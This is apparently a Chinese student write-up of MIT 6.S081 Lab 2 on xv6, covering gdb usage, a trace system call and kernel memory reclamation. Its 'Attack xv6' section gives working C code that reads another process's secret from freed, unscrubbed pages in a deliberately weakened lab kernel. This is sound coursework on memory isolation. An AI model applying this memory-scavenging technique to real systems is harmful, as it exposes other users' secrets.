# Lab 2 System calls

在开始之前，我们回顾一下怎么启动调试模式：

在一个终端里执行 `make qemu-gdb` ，`make qemu-gdb CPUS=1` 可以只使用一个核心，比起多线程更便于调试。

在另一个终端里执行 `gdb-multiarch kernel/kernel` ，进入 gdb 后执行 `target remote localhost:26001`，这里的端口号不一定是 26001，看 `make qemu-gdb CPUS=1` 的打印结果就行。

这样就进入调试模式了。另外，我习惯用 `set prompt \001\033[1;33m\002(gdb) \001\033[0m\002` 来高亮 “(gdb)” 这几个字。

## Using gdb

lab 开头让我们熟悉一下 gdb 的使用。启动调试模式以后按部就班就能完成，我们这里记录一下常用的一些 gdb 指令：

```
c 或 continue - 继续执行直到遇到下一个断点

n 或 next - 单步执行,会跳过函数调用

s 或 step - 单步执行,会进入函数内部

si - 执行一条汇编指令

finish - 运行到当前函数返回为止

p /x $mstatus - 以十六进制打印CPU当前模式

backtrace（缩写bt） - 显示函数调用栈

set prompt \\001\\033[1;33m\\002(gdb) \\001\\033[0m\\002 - 高亮(gdb)

until - 运行到指定行号为止
```

## System call tracing

这道题让我们实现一个系统调用，按着 hints 按部就班就能做掉。唯一要注意的是在 syscall 里打印 trace 相关的内容时要把系统调用的返回值 ret 从原本的 `uint64` 转换为 `long long`，否则对那些可能返回 -1 的系统调用，我们无法正确打印 -1.

在照着 hints 实现之后，看看系统调用是如何进行的也是更有趣的事情。我在 {% post_link learning/open-course/MIT-6.S081/Labs/lab2_1-syscall_process 'Lab 2.1 系统调用流程——以sleep为例' %} 中写得还挺详细的，这里不多赘述细节。

简而言之，当我们进行系统调用时：

1. 进入由 `usys.pl` 生成的 `usys.S` 
2. ecall 触发异常并跳转到 `trapoline.S` 的 uservec 处
3. 到达 `trap.c` 的 usertrap 函数，它会调用 syscall 函数以执行系统函数的逻辑
4. 系统函数执行完成后进入usertrapret函数
5. 跳转到 `trapoline.S` 的userret处
6. 最后回到 `usys.S`
7. 回到用户的代码里。

让我们根据这个流程来看看 hints 的每一步的原因：

1. 把 `$U/_trace` 加入到 Makefile 中是为了编译时识别到 `trace`。
2. 在 `user.h` 里加入 `trace` 是为了让用户的 `trace.c` 识别到 `trace` 这个函数。
3. 在 `usys.pl` 里加入 `trace` 是为了让 `usys.pl` 在生成的 `usys.S` 里加入 `trace` 相关的内容，它是我们进行系统调用时的第一站。
4. 在 `syscall.h` 里加入 `trace` 是因为我们通过寄存器里存储的整数确定调用的系统函数，很多地方都使用了这个文件里定义的常量。
5. 在 `syscall.c` 和 `sysproc.c` 里加入的函数则是实际的逻辑部分，由 syscall 函数调用。

## Attack xv6

在 xv6 的 syscall 分支上有一个漏洞——进程被回收后，它曾经使用的物理内存不会被重置为垃圾数据，而是保持之前的状态。所以我们可以打破内存隔离，访问别的已经被回收的进程的内存。

我们看向 `secret.c`，会发现它请求了 32 个物理页大小的物理内存，然后把一串字符放在了某个物理页的开头。所以我们只要在 `attck.c` 里也请求一些物理页，然后找到这串字符串就行。

我们先请求 32 个物理页然后依次打印出每个物理页开头的一串字符，结果如下：

```
第 1 页: ��
第 2 页: �              第 3 页:  �
第 4 页: ��             第 5 页: �
第 6 页: 0�             第 7 页:  �
第 8 页: �              第 9 页: ��/cea.ae
第 10 页: @�7�G�������f���13��fv␦3              第 11 页: P�#4��"�����`Bdaa��q�"�
                                                                                 ��
第 12 页: ��

� attackte              第 13 页: p�
第 14 页: `�            第 15 页:  ���
第 16 页: ��7�G�������f���13��fv␦3              第 17 页: ��very very secret pw is: /cea.ae
第 18 页: ��            第 19 页: p�
第 20 页: 0�            第 21 页: 0��
第 22 页: @��           第 23 页: P��
第 24 页: ��            第 25 页: ���
第 26 页: P�            第 27 页: @�
第 28 页: 0�            第 29 页: �
�&�J����lE�`*&�J�               第 31 页: ������?���
第 32 页: ���          
```

可以注意到大多数都是乱码，这是因为内存里有非文本的二进制数据，它们不能被当作文本输出。

当然，我们会注意到第 17 页有 “very very secret pw is: /cea.ae”，它与 `secret.c` 写入的内容唯一的区别是少了 “my very ” 这八个字符。为什么会有八个字符的差异呢？

看向 `kallc.c` 的 `kfree`：

```c
void kfree(void *pa) {
    struct run *r;

    if (((uint64)pa % PGSIZE) != 0 || (char *)pa < end || (uint64)pa >= PHYSTOP)
        panic("kfree");

#ifndef LAB_SYSCALL
    // Fill with junk to catch dangling refs.
    memset(pa, 1, PGSIZE);
#endif

    r = (struct run *)pa;

    acquire(&kmem.lock);
    r->next = kmem.freelist;
    kmem.freelist = r;
    release(&kmem.lock);
}
```

结合 `struct run` 的定义，就能知道 `r->next = kmem.freelist` 这句语句是把一个指针放在了输入的物理地址的前八个 bytes 中。这正是之前八个字符的差异的由来。

总结一下，在运行 `secret.c` 的进程被回收后，其中包含 “my very very very secret pw is: /cea.ae” 的物理页的开头八个 bytes 被指针覆盖，所以只剩下了 “[8 bytes 指针]very very secret pw is: /cea.ae”. 所以我们多请求几个新的物理页然后遍历它们，用前缀 “very very secret pw is: ” 来匹配就行。

我们在文末会更具体地讲讲进程被回收的过程，但先让我们来看看代码：

```c
int strncmp(const char *str1, const char *str2, int n);
// kalloc.c 的 kfree 函数里把物理页的开头换成了一个指针.
// 所以我们丢失了开头的 sizeof(指针) 个字符.
const int overwrite_len = sizeof(void *);

int main(int argc, char *argv[]) {
    char *end;
    char *prefix = "my very very very secret pw is: ";
    int cmplen = strlen(prefix) - overwrite_len;

    // 遍历新插入的32个物理页
    for (int i = 0; i < 32; i++) {
        end = sbrk(PGSIZE);
        if (strncmp(end + overwrite_len, prefix + overwrite_len, cmplen) == 0) {
            write(2, end + 32, 8);
            exit(0);
        }
    }
    exit(1);
}
```

这里把内容写进文件描述符 2 是因为 `attacktest.c` 里开了一个管道，运行 `attack.c` 的进程的文件描述符 2 连接着管道写端，运行 `attacktest.c` 的进程则在读取管道读端。下面的代码就是把 `attack.c` 的文件描述符 2 连接到管道写端的代码：

```c
if (pid == 0) {
    close(fds[0]);
    close(2);
    dup(fds[1]);
    char *newargv[] = {"attack", 0};
    exec(newargv[0], newargv);
    printf("exec %s failed\n", newargv[0]);
    exit(1);
}
```

## 进程被回收的过程

一个进程调用 exit(int) 后会进入 ZOMBIE 状态，但并不立即释放物理内存，而是会唤醒其父进程：

```c
void exit(int status) {
    // 我们在这里省略了很多代码，有兴趣可以自己看 proc.c
    wakeup(p->parent);
    p->state = ZOMBIE;
}
```

父进程调用 wait(uint64) 会找到 ZOMBIE 子进程并调用 `freeproc` 来回收它：

```c
int wait(uint64 addr) {
    // 我们在这里省略了很多代码，有兴趣可以自己看 proc.c
    struct proc *pp;
    struct proc *p = myproc();

    for (;;) {
        for (pp = proc; pp < &proc[NPROC]; pp++) {
            if (pp->parent == p && pp->state == ZOMBIE) {
                // Found one.
                pid = pp->pid;
                freeproc(pp);
                return pid;
        }

        // Wait for a child to exit.
        sleep(p, &wait_lock); // DOC: wait-sleep
    }
}
```

freeproc 则又调用 `proc_freepagetable` 来回收物理内存：

```c
// Free a process's page table, and free the
// physical memory it refers to.
void proc_freepagetable(pagetable_t pagetable, uint64 sz) {
    uvmunmap(pagetable, TRAMPOLINE, 1, 0);
    uvmunmap(pagetable, TRAPFRAME, 1, 0);
    uvmfree(pagetable, sz);
}
```

其中的 `uvmfree(pagetable, sz)` 就在释放物理内存了：

```c
// Free user memory pages,
// then free page-table pages.
void uvmfree(pagetable_t pagetable, uint64 sz) {
    if (sz > 0)
        uvmunmap(pagetable, 0, PGROUNDUP(sz) / PGSIZE, 1);
    freewalk(pagetable);
}
```

让我们看向 `uvmunmap`，它获取每一页的物理地址然后调用 `kfree`：

```c
// Remove npages of mappings starting from va. va must be
// page-aligned. The mappings must exist.
// Optionally free the physical memory.
void uvmunmap(pagetable_t pagetable, uint64 va, uint64 npages, int do_free) {
    uint64 a;
    pte_t *pte;
    int sz;

    if ((va % PGSIZE) != 0)
        panic("uvmunmap: not aligned");

    for (a = va; a < va + npages * PGSIZE; a += sz) {
        sz = PGSIZE;
        if ((pte = walk(pagetable, a, 0)) == 0)
            panic("uvmunmap: walk");
        if ((*pte & PTE_V) == 0) {
            printf("va=%ld pte=%ld\n", a, *pte);
            panic("uvmunmap: not mapped");
        }
        if (PTE_FLAGS(*pte) == PTE_V)
            panic("uvmunmap: not a leaf");
        if (do_free) {
            uint64 pa = PTE2PA(*pte);
            kfree((void *)pa);
        }
        *pte = 0;
    }
}
```

更细节的释放 trapframe、释放页表我们就不在这里多说了。